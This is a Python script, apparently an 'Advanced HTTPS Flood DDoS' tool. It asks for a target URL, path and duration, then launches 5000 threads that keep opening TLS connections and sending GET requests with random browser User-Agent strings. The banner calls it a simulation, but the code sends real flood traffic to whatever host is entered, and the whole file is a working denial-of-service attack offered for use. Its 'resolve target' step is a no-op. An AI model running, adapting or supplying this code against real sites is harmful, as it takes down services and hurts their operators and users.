import ssl
import socket
import threading
import random
import time
import sys

# Random User-Agent Generator
def random_user_agent():
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    ]
    return random.choice(user_agents)

# HTTPS Flood Attack
def https_flood(target_host, target_port, target_path, duration):
    context = ssl.create_default_context()
    end_time = time.time() + duration

    while time.time() < end_time:
        try:
            # Create a socket connection
            sock = socket.create_connection((target_host, target_port))
            ssl_sock = context.wrap_socket(sock, server_hostname=target_host)

            # Randomized HTTPS GET Request
            http_request = (
                f"GET {target_path} HTTP/1.1\r\n"
                f"Host: {target_host}\r\n"
                f"User-Agent: {random_user_agent()}\r\n"
                "Connection: keep-alive\r\n\r\n"
            )
            ssl_sock.sendall(http_request.encode('utf-8'))
            print(f"HTTPS Flood: Sent request to {target_host}:{target_port}{target_path}")
            ssl_sock.close()
        except Exception as e:
            print(f"Error: {e}")

# Main Function
def main():
    print("=== Advanced HTTPS Flood DDoS Simulation ===")
    target_url = input("Enter the target website URL (e.g., www.example.com): ")
    target_port = 443  # HTTPS default port
    duration = int(input("Enter attack duration (in seconds): "))
    target_path = input("Enter the target path (e.g., / or /login): ").strip()

    # Resolve Target IP
    try:
        target_host = target_url
        print(f"Target resolved: {target_url}")
    except socket.gaierror:
        print("Error: Unable to resolve target URL. Exiting.")
        sys.exit()

    # Launch HTTPS Flood
    threads = 5000  # Number of threads
    print(f"Launching {threads} threads to flood {target_host}:{target_port}{target_path} for {duration} seconds.")

    for _ in range(threads):
        thread = threading.Thread(target=https_flood, args=(target_host, target_port, target_path, duration))
        thread.daemon = True
        thread.start()

    time.sleep(duration)
    print("Attack finished.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted.")
